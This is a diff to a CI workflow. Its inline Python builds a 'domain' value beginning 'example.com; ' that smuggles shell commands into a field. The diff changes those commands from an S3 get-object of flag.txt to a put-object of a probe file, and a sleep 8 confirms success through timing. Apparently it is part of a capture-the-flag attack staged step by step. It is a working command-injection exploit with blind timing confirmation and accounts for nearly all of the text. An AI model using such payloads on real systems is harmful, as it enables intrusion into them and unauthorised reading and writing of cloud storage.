@@ -1,4 +1,4 @@
-name: Stage2-18-Calibrate-S3-Read
+name: Stage2-19-Calibrate-S3-Write
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Calibrate flag read
+      - name: Calibrate S3 write
         run: |
           python3 - <<'PY'
           import os
@@ -44,13 +44,14 @@ jobs:
 
           domain = (
               "example.com; "
-              "if /opt/aws s3api get-object "
+              "printf CTF_PROBE > /tmp/ctf_probe; "
+              "if /opt/aws s3api put-object "
               "--bucket logad88e2b168aa387e "
-              "--key flag.txt "
-              "/tmp/log-flag.txt "
+              "--key ctf-probe-calibration.txt "
+              "--body /tmp/ctf_probe "
               "--region us-east-1 "
               "--endpoint-url https://s3.us-east-1.amazonaws.com "
-              ">/dev/null 2>&1; "
+              ">/tmp/aws_result 2>&1; "
               "then sleep 8; "
               "fi"
           )
